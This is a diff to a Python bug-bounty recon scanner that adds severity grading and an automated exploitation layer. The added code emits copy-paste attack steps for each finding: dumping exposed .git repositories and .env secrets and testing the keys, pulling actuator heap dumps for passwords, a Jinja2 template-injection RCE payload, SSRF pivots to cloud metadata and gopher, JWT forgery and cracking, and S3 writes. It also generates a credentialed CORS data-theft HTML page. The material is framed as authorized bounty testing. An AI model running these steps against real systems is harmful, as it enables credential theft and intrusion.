@@ -307,9 +307,36 @@ SENSITIVE_PATHS = [
     "/.DS_Store","/.htaccess","/.htpasswd",
 ]
 
+# Public/benign files that live in SENSITIVE_PATHS only as "worth reading", NOT
+# as vulnerabilities — reporting these as High is pure noise to a triager.
+BENIGN_PATHS = {
+    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
+    "/.well-known/security.txt", "/.well-known/change-password",
+    "/.well-known/openid-configuration", "/.well-known/jwks.json",
+}
+# Substrings that mark a genuinely dangerous exposure (secrets, VCS, DB, debug).
+_CRITICAL_MARKERS = (".env", ".git/", ".htpasswd", "backup", "dump.sql", ".sqlite",
+                     "db_backup", "id_rsa", "credentials", "/adminer", "/phpmyadmin")
+_HIGH_MARKERS     = ("/metrics", "/actuator", "debug", "/env", "swagger", "openapi",
+                     "/.ds_store", "/config", "/.htaccess", "server-status",
+                     "/graphql", "pprof", "/rest/")
+
+def endpoint_severity(url_or_path: str) -> str:
+    """Grade a discovered endpoint instead of calling everything High.
+    Benign public files → Info; secrets/VCS/DB → Critical; metrics/debug/config
+    /admin panels → High; everything else that's reachable+non-HTML → Medium."""
+    p = urlparse(url_or_path).path.lower() if "://" in url_or_path else url_or_path.lower()
+    if p in BENIGN_PATHS:
+        return "Info"
+    if any(m in p for m in _CRITICAL_MARKERS):
+        return "Critical"
+    if any(m in p for m in _HIGH_MARKERS):
+        return "High"
+    return "Medium"
+
 # ── Security headers ──────────────────────────────────────────────────────────
 REQUIRED_HEADERS = {
-    "content-security-policy":       ("High",   "CSP missing — XSS risk increased"),
+    "content-security-policy":       ("Medium", "CSP missing — XSS risk increased"),
     "x-content-type-options":        ("Low",    "MIME-type sniffing enabled"),
     "x-frame-options":               ("Medium", "Clickjacking possible"),
     "strict-transport-security":     ("Medium", "HSTS missing — MITM risk"),
@@ -1954,6 +1981,198 @@ def print_ascii_chart(findings: list):
     print("─" * 50)
 
 # ── Report generation ─────────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+#  EXPLOITATION LAYER — turn a raw finding into something reportable
+#  For each finding: a report VERDICT + concrete exploitation/PoC steps + impact.
+#  Verdicts:  yes    = exploitable, demonstrable impact (worth a report)
+#             manual = real only if you prove concrete impact by hand first
+#             no     = hardening/informational, NOT a standalone bounty report
+# ══════════════════════════════════════════════════════════════════════════════
+VERDICT_LABEL = {"yes":"✅ EXPLOITABLE", "manual":"🔶 NEEDS MANUAL PROOF",
+                 "no":"⛔ NOT REPORTABLE ALONE"}
+
+def _exp(verdict, impact, steps, poc=None):
+    return {"verdict": verdict, "impact": impact, "steps": steps, "poc": poc}
+
+def exploitation_for(f: dict, domain: str) -> dict:
+    """Return an exploitation plan for a finding. Steps are copy-paste ready and
+    scoped to the finding's own URL — this is what you actually put in a report."""
+    cat  = (f.get("category") or "").lower()
+    url  = f.get("url") or f.get("host") or f"https://{domain}"
+    ev   = (f.get("evidence") or f.get("snippet") or "").lower()
+    path = urlparse(url).path.lower() if "://" in url else ""
+    host = urlparse(url).netloc or domain
+
+    # ── Exposures: branch on exactly what is exposed ──────────────────────────
+    if cat == "exposure":
+        if f.get("severity") == "Info" or path in BENIGN_PATHS:
+            return _exp("no", "Public/benign file — informational only, not a standalone bounty.",
+                ["Do not submit. Note it only as context (e.g. a path in robots.txt that reveals a hidden endpoint worth testing)."])
+        if ".git" in path:
+            return _exp("yes", "Full source-code & secret disclosure (often creds/keys in history).",
+                [f'git-dumper {url.rsplit("/.git",1)[0]}/.git/ loot/   # or: wget -r {url}',
+                 "cd loot && git log -p | grep -iE \"password|secret|api[_-]?key|token\"",
+                 "Recover removed files: git checkout -- . ; review config/.env in history"])
+        if ".env" in path:
+            return _exp("yes", "Credential/API-key disclosure → pivot to the services those creds unlock.",
+                [f'curl -s "{url}"',
+                 "Extract KEY=VALUE pairs; validate each live key (AWS: aws sts get-caller-identity, etc.)",
+                 "Report the leak AND any access the keys granted (that is the real impact)."])
+        if "/metrics" in path:
+            return _exp("manual", "Internal telemetry disclosure. Only report if it leaks internal "
+                                  "hostnames, routes, tenant/user counts, or versions — raw counters alone are weak.",
+                [f'curl -s "{url}" | grep -iE "host|url|route|path|target|addr|version|email" | sort -u',
+                 "Screenshot any internal hostname / private IP / route it reveals.",
+                 "Chain: if a Prometheus pushgateway, test unauth metric injection."])
+        if "actuator" in path:
+            return _exp("yes", "Spring Actuator: env secrets, heap dump with credentials, sometimes RCE via jolokia.",
+                [f'curl -s "{url.rsplit("/actuator",1)[0]}/actuator/env" | jq . | grep -i "pass\\|secret\\|key"',
+                 f'curl -s "{url.rsplit("/actuator",1)[0]}/actuator/heapdump" -o heap.bin && strings heap.bin | grep -i password',
+                 "If /actuator/jolokia present: attempt MBean RCE (well-documented chain)."])
+        if "swagger" in path or "openapi" in path or "/graphql" in path:
+            return _exp("manual", "API surface disclosure → hunt broken-auth/IDOR on the documented routes.",
+                [f'Open {url} and import the spec into Postman/Burp.',
+                 "Call each endpoint unauthenticated and as a low-priv user; look for data you shouldn't see.",
+                 "The reportable bug is the broken endpoint you find, not the spec itself."])
+        if path.endswith(".map"):
+            return _exp("manual", "Source map → recovers original client source (may reveal endpoints/keys/logic).",
+                [f'curl -s "{url}" -o app.js.map && npx shuji app.js.map -o src/   # or source-map-explorer',
+                 "Grep recovered source for api keys, internal endpoints, auth logic to attack."])
+        return _exp("manual", "Reachable non-public resource — confirm it exposes data/function you shouldn't reach.",
+            [f'curl -si "{url}"', "Demonstrate concrete sensitive content before reporting."])
+
+    if cat == "cors":
+        high = "acac" in ev or "credentials" in ev
+        return _exp("yes" if high else "manual",
+            "Cross-origin theft of authenticated data (ATO-adjacent) if credentials are reflected.",
+            [f'Confirm: curl -si -H "Origin: https://evil.example.com" "{url}" | grep -i access-control',
+             "Open the generated CORS PoC HTML from another origin while logged in — it reads your data cross-site.",
+             "Impact proof = screenshot of victim data exfiltrated to attacker origin."], poc="cors")
+
+    if cat == "open-redirect":
+        return _exp("manual", "Phishing, and OAuth/SSO token theft when the param is an OAuth redirect_uri.",
+            [f'Confirm 3xx to attacker host: curl -si "{url}"',
+             "If it is an OAuth redirect_uri: chain to steal the auth code/token (that is the High-impact report).",
+             "Otherwise frame it as credential-phishing; standalone open-redirect is often Low."])
+
+    if cat == "ssrf":
+        return _exp("manual", "Internal network / cloud-metadata access → credential theft → sometimes RCE.",
+            [f'Inject your OOB listener: {url}  (watch interactsh/Collaborator for a hit)',
+             "On a hit, target cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+             "Escalate with gopher:// to hit internal services; report the internal resource you actually reached."])
+
+    if cat == "idor":
+        return _exp("manual", "Cross-account data access/modification (OWASP API1) — classic High/Critical.",
+            [f'As user A, note the object id at {url}.',
+             'As user B (different token), request A\'s id: curl -si -H "Authorization: Bearer <TOKEN_B>" "<url>/<A_id>"',
+             "Impact proof = user B successfully reads/edits user A's data. Two accounts required."])
+
+    if cat == "ssti":
+        return _exp("yes", "Server-side template injection → RCE on most engines.",
+            [f'Confirm arithmetic executed (49 reflected): {url}',
+             "Escalate per engine (Jinja2 example): {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+             "Automate with tplmap; report the command output as proof."])
+
+    if cat == "graphql":
+        return _exp("manual", "Schema disclosure → find unauth mutations / IDOR; batching → brute/rate-limit bypass.",
+            ['Dump schema, then enumerate mutations and sensitive queries.',
+             "Call them unauthenticated / as low-priv; the reportable bug is the exposed operation, not introspection itself."])
+
+    if cat == "jwt":
+        if "none" in ev or "alg:none" in (f.get("title","").lower()):
+            return _exp("yes", "Auth bypass / full account takeover via unsigned token.",
+                ['Decode the JWT, set header alg to "none", strip the signature, set sub/role to a victim/admin.',
+                 "Replay it; if accepted you have ATO. That acceptance is the proof."])
+        return _exp("manual", "Potential key confusion / weak-secret signing.",
+            ["If HS256: hashcat -m 16500 <jwt> rockyou.txt to crack the secret, then forge.",
+             "If RS256: test HS256 key-confusion with the public key as HMAC secret."])
+
+    if cat == "dns-takeover":
+        return _exp("yes", "Subdomain takeover → serve attacker content on a trusted subdomain (cookie theft, phishing, OAuth).",
+            [f'Claim the dangling service named in the CNAME for {host}.',
+             "Host a proof page; screenshot your content served on the victim subdomain."])
+
+    if cat == "s3":
+        return _exp("yes", "Public cloud bucket read (and sometimes write) — data disclosure / content injection.",
+            [f'aws s3 ls s3://<bucket> --no-sign-request',
+             "aws s3 cp s3://<bucket>/<object> . --no-sign-request   # prove read",
+             "Test write: aws s3 cp evil.txt s3://<bucket>/ --no-sign-request (only if write is in scope)."])
+
+    if cat == "cache-poison":
+        return _exp("manual", "Persistent XSS/redirect served to other users via the shared cache.",
+            [f'Confirm your injected Host reflects AND the response is cached (X-Cache/Age).',
+             "Prove it poisons a victim: request without your header shows your payload (use a safe marker, not real XSS)."])
+
+    if cat in ("outdated-lib","cve-fingerprint"):
+        return _exp("manual", "Known-CVE exposure — impact depends on reachable sink.",
+            [f'Confirm the exact version at {url}.',
+             "Find the matching public PoC for that CVE and demonstrate it against a reachable path.",
+             "Report only with a working PoC — a version banner alone is usually informational."])
+
+    if cat == "headers":
+        # Missing headers are NOT a standalone bounty (triagers reject them).
+        # Verdict stays "no" so they don't pollute the chase-list — but if frame
+        # protection is absent we still hand over a clickjacking PoC + how to check,
+        # since that's the one path that could become real with a framable action.
+        clickjack = ("x-frame-options" in ev) and ("content-security-policy" in ev)
+        if clickjack:
+            return _exp("no", "Hardening gap. Clickjacking is only reportable if a SENSITIVE state-changing "
+                              "action can be framed — otherwise triagers reject it.",
+                ["Open the generated clickjacking PoC HTML; does the page frame?",
+                 "Find a sensitive one-click action (delete, transfer, change email) that works framed.",
+                 "Only THEN is it reportable — bare 'missing X-Frame-Options' is not."], poc="clickjack")
+        return _exp("no", "Missing security headers are hardening gaps; not an independently rewardable bug.",
+            ["Do not submit alone. Use only as supporting context inside a real XSS/clickjacking report."])
+
+    if cat in ("tls","dns-sec","cookies","waf","idn-homoglyph"):
+        return _exp("no", "Best-practice / hardening finding — generally out of scope or non-paying on its own.",
+            ["Do not submit standalone; mention only as context inside a real vulnerability report."])
+
+    return _exp("manual", "Validate and demonstrate concrete impact before reporting.",
+        [f'Reproduce: {f.get("command") or url}'])
+
+def generate_poc_files(findings: list, domain: str, out_dir: Path):
+    """Write real PoC artifacts (clickjacking / CORS) the user can open in a browser."""
+    poc_dir = out_dir / "poc"
+    made = False
+    for f in findings:
+        exp = f.get("exploit") or {}
+        kind = exp.get("poc")
+        url = f.get("url") or f"https://{domain}"
+        if kind == "clickjack":
+            poc_dir.mkdir(parents=True, exist_ok=True); made = True
+            p = poc_dir / f"clickjacking_{urlparse(url).netloc or domain}.html"
+            p.write_text(f"""<!doctype html><html><head><meta charset="utf-8">
+<title>Clickjacking PoC — {url}</title></head><body>
+<h3>Clickjacking PoC for {url}</h3>
+<p>If the target renders below, it lacks frame protection. Overlay a lure over a
+sensitive button to prove UI-redress. Only a report if a sensitive action is framable.</p>
+<iframe src="{url}" width="1000" height="700" style="opacity:0.5;border:2px solid red"></iframe>
+</body></html>""", encoding="utf-8")
+            f["poc_file"] = str(p)
+        elif kind == "cors":
+            poc_dir.mkdir(parents=True, exist_ok=True); made = True
+            p = poc_dir / f"cors_{urlparse(url).netloc or domain}.html"
+            p.write_text(f"""<!doctype html><html><head><meta charset="utf-8">
+<title>CORS exfil PoC — {url}</title></head><body>
+<h3>CORS credentialed-read PoC for {url}</h3>
+<pre id="out">running…</pre>
+<script>
+// Host this on an attacker origin, open it while logged into the target.
+fetch("{url}", {{credentials:"include"}})
+  .then(r => r.text())
+  .then(d => {{ document.getElementById('out').textContent = d.slice(0,2000);
+               /* real attacker would POST d to their server */ }})
+  .catch(e => document.getElementById('out').textContent = "blocked: " + e);
+</script></body></html>""", encoding="utf-8")
+            f["poc_file"] = str(p)
+    return poc_dir if made else None
+
+def attach_exploitation(result: ScanResult, domain: str, out_dir: Path):
+    for f in result.findings:
+        f["exploit"] = exploitation_for(f, domain)
+    generate_poc_files(result.findings, domain, out_dir)
+
 def generate_markdown(result: ScanResult, out_path: Path):
     sev_counts = {}
     for f in result.findings:
@@ -2052,6 +2271,19 @@ def generate_markdown(result: ScanResult, out_path: Path):
     if result.ai_plan:
         lines += ["## 🤖 AI Attack Plan", "", result.ai_plan, ""]
 
+    # Report-worthiness triage: what actually has an exploit path vs. pure noise
+    if any(f.get("exploit") for f in result.findings):
+        worthy = [f for f in result.findings if (f.get("exploit") or {}).get("verdict") in ("yes","manual")]
+        noise  = [f for f in result.findings if (f.get("exploit") or {}).get("verdict") == "no"]
+        lines += ["## 🎯 Report Triage — chase these (the rest are hardening noise)", "",
+                  f"- ✅/🔶 **{len(worthy)}** findings have an exploitation path worth pursuing",
+                  f"- ⛔ **{len(noise)}** are hardening/informational — do **not** submit standalone", ""]
+        for f in sorted(worthy, key=lambda x: SEV_ORDER.get(x.get("severity","Info"),4)):
+            exp = f["exploit"]
+            lines.append(f"- {VERDICT_LABEL.get(exp['verdict'],'')} · **[{f.get('severity','')}]** "
+                         f"{f.get('title') or f.get('detail','')} — `{f.get('url') or f.get('host','')}`")
+        lines += [""]
+
     lines += ["## Findings",""]
     sorted_f = sorted(result.findings, key=lambda f: SEV_ORDER.get(f.get("severity","Info"),4))
     for i, f in enumerate(sorted_f, 1):
@@ -2066,6 +2298,13 @@ def generate_markdown(result: ScanResult, out_path: Path):
         ev = f.get("evidence") or f.get("snippet") or f.get("detail","")
         if ev: lines += ["**Evidence:**","```",ev[:300],"```"]
         if f.get("command"): lines += ["**Reproduce:**","```bash",f["command"],"```"]
+        exp = f.get("exploit")
+        if exp:
+            lines += ["", f"**Report verdict:** {VERDICT_LABEL.get(exp['verdict'],'')}  ",
+                      f"**Impact:** {exp['impact']}  ", "**Exploitation / PoC:**"]
+            lines += [f"{n}. {s}" for n, s in enumerate(exp["steps"], 1)]
+            if f.get("poc_file"):
+                lines.append(f"\n> 📎 PoC file generated: `{f['poc_file']}`")
         if f.get("remediation"): lines.append(f"**Remediation:** {f['remediation']}")
         lines += [""]
 
@@ -2107,6 +2346,13 @@ def generate_html(result: ScanResult, out_path: Path):
         url = f.get("url") or f.get("host","")
         ev = f.get("evidence") or f.get("snippet") or f.get("detail","")
         cmd = f.get("command",""); rem = f.get("remediation","")
+        exp = f.get("exploit") or {}
+        exp_html = ""
+        if exp:
+            steps = "".join(f"<li>{esc(s)}</li>" for s in exp.get("steps",[]))
+            pocf = f'<div class="rem">📎 PoC file: <code>{esc(f.get("poc_file",""))}</code></div>' if f.get("poc_file") else ""
+            exp_html = (f'<div class="exp"><b>{esc(VERDICT_LABEL.get(exp.get("verdict",""),""))}</b>'
+                        f' — {esc(exp.get("impact",""))}<ol>{steps}</ol>{pocf}</div>')
         rows.append(f"""<div class="card" data-sev="{esc(sev)}">
   <div class="cardhead"><span class="pill" style="background:{colors.get(sev,'#888')}">{esc(sev)}</span>
     <span class="num">#{i}</span><span class="cat">{esc(f.get('category',''))}</span></div>
@@ -2114,6 +2360,7 @@ def generate_html(result: ScanResult, out_path: Path):
   {f'<div class="target">{esc(url)}</div>' if url else ''}
   {f'<pre class="ev">{esc(ev[:600])}</pre>' if ev else ''}
   {f'<pre class="cmd">{esc(cmd)}</pre>' if cmd else ''}
+  {exp_html}
   {f'<div class="rem"><b>Remediation:</b> {esc(rem)}</div>' if rem else ''}
 </div>""")
 
@@ -2141,6 +2388,8 @@ h3{{margin:8px 0;font-size:16px}}
 .target{{color:#6fb3ff;font-family:ui-monospace,monospace;font-size:13px;word-break:break-all}}
 pre{{background:#0f1115;border:1px solid #262b36;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}}
 .cmd{{color:#9ae6b4}} .rem{{margin-top:8px;color:#cbd3df;font-size:13.5px}}
+.exp{{margin-top:10px;padding:10px;border-left:3px solid #d7263d;background:#1d1420;border-radius:6px;font-size:13.5px}}
+.exp ol{{margin:6px 0 0;padding-left:20px}} .exp li{{margin:3px 0}} .exp code{{color:#9ae6b4}}
 footer{{color:#5b6472;font-size:12px;padding:20px;text-align:center}}
 </style></head><body>
 <header><div class="wrap"><h1>Bug Bounty Recon — {esc(result.target)}</h1>
@@ -2155,14 +2404,18 @@ def print_finding(f: dict):
     t   = f.get("title") or f.get("detail") or f.get("header","")
     url = f.get("url") or f.get("host","")
     ev  = (f.get("evidence") or f.get("snippet") or "")[:100]
+    exp = f.get("exploit") or {}
+    vlabel = VERDICT_LABEL.get(exp.get("verdict",""), "")
     if HAS_RICH:
         console.print(f"  {em} [bold]{sev}[/bold] {t}")
         if url: console.print(f"     [cyan]{url}[/cyan]")
         if ev:  console.print(f"     [green]{ev}[/green]")
+        if vlabel: console.print(f"     [magenta]{vlabel}[/magenta] — {exp.get('impact','')}")
     else:
         print(f"  {em} [{sev}] {t}")
         if url: print(f"     {url}")
         if ev:  print(f"     {ev}")
+        if vlabel: print(f"     {vlabel} — {exp.get('impact','')}")
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  AI TRIAGE  (folded in from the former claude_hunter.py + artemis_triage.py)
@@ -2344,6 +2597,8 @@ def main():
     ap.add_argument("--timeout",              type=int, default=TIMEOUT, help=f"Per-request timeout seconds (default {TIMEOUT})")
     ap.add_argument("--verbose",              action="store_true", help="Show per-host errors during concurrent phases")
     ap.add_argument("--html",                 action="store_true", help="Also write a self-contained HTML report")
+    ap.add_argument("--no-exploit",           action="store_true", dest="no_exploit",
+                    help="Do not attach exploitation plans / generate PoC files")
     # ── v4.0: AI triage (folds in the old claude_hunter.py / artemis_triage.py) ─
     ap.add_argument("--ai-triage",            action="store_true", dest="ai_triage",
                     help="Run 3-phase AI triage on findings (auto-detects Ollama/Groq/Anthropic)")
@@ -2484,15 +2739,39 @@ def main():
     for url in scan_urls[:5]:
         ep_f, ep_p = sweep_endpoints(url)
         for f in ep_f:
-            all_findings.append({"severity":"High","category":"exposure","title":f"Sensitive endpoint: {f['url'].split('/')[-1] or '(root)'}","url":f["url"],"command":f["command"],"evidence":f"HTTP 200 | {f['content_type']} | {f['snippet'][:100]}","remediation":"Restrict to internal or add auth"})
+            sev = endpoint_severity(f["url"])
+            leaf = f["url"].split("/")[-1] or "(root)"
+            label = "Reachable endpoint" if sev == "Info" else "Sensitive endpoint"
+            rem = ("Public file — informational only; no action usually needed."
+                   if sev == "Info" else "Restrict to internal, require auth, or remove from webroot.")
+            all_findings.append({"severity":sev,"category":"exposure",
+                "title":f"{label}: {leaf}","url":f["url"],"command":f["command"],
+                "evidence":f"HTTP 200 | {f['content_type']} | {f['snippet'][:100]}","remediation":rem})
         all_passed.extend(ep_p)
 
     # 6. Security headers + cookies
     console.print("\n[bold]6. Security Headers & Cookie Audit[/bold]" if HAS_RICH else "\n6. Headers + Cookies")
     for url in scan_urls[:5]:
         hf, hp = check_headers(url)
-        for f in hf:
-            all_findings.append({"severity":f["severity"],"category":"headers","title":f"Header: {f['header']}","url":f.get("url",url),"command":f.get("command",""),"evidence":f.get("evidence",""),"remediation":f.get("remediation","")})
+        # Consolidate all *missing* security headers for this host into ONE finding
+        # (a triager does not want 6-9 separate Low rows per host). Specific CSP
+        # directive issues and server-version leaks stay as their own findings.
+        missing = [f for f in hf if f["header"] in REQUIRED_HEADERS]
+        other   = [f for f in hf if f["header"] not in REQUIRED_HEADERS]
+        if missing:
+            names = [f["header"] for f in missing]
+            grp_sev = "Medium" if any(f["severity"] == "Medium" for f in missing) else "Low"
+            all_findings.append({"severity":grp_sev,"category":"headers",
+                "title":f"Missing security headers ({len(names)})","url":url,
+                "command":f'curl -sI "{url}"',
+                "evidence":"Absent: " + ", ".join(names),
+                "remediation":"Add the headers at the edge/CDN. Note: on most bug-bounty programs "
+                              "missing headers are informational and not independently rewarded."})
+        for f in other:
+            all_findings.append({"severity":f["severity"],"category":"headers",
+                "title":f"Header: {f['header']}","url":f.get("url",url),
+                "command":f.get("command",""),"evidence":f.get("evidence",""),
+                "remediation":f.get("remediation","")})
         all_passed.extend(hp)
         try:
             _, resp_hdrs, _ = http_get(url, timeout=8)
@@ -2681,6 +2960,9 @@ def main():
     all_findings = dedup_findings(all_findings)
     result.findings = all_findings
     result.passed   = all_passed
+    # Attach exploitation plans + write PoC files (the whole point: make it reportable)
+    if not args.no_exploit:
+        attach_exploitation(result, domain, out_dir)
     result.summary  = {
         "total":    len(all_findings),
         "critical": sum(1 for f in all_findings if f.get("severity")=="Critical"),
